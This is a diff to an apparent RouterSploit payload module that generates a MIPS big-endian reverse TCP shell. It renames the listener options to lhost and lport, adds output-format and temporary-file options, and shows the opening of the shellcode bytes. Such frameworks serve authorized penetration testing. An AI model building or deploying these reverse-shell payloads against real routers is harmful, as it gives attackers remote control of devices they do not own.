@@ -2,6 +2,7 @@ from routersploit import (
     exploits,
     payloads,
     validators,
+    random_text
 )
 
 
@@ -18,12 +19,16 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "mipsbe"
-    target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
-    port = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
+    handler = "reverse_tcp"
+    lhost = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
+    lport = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
+
+    output = exploits.Option('python', 'Output type: elf/c/python')
+    filepath = exploits.Option("/tmp/{}".format(random_text(8)), 'Output file to write')
 
     def generate(self):
-        reverse_ip = self.convert_ip(self.target)
-        reverse_port = self.convert_port(self.port)
+        reverse_ip = self.convert_ip(self.lhost)
+        reverse_port = self.convert_port(self.lport)
 
         self.payload = (
             "\x28\x04\xff\xff" +            # slti     a0,zero,-1
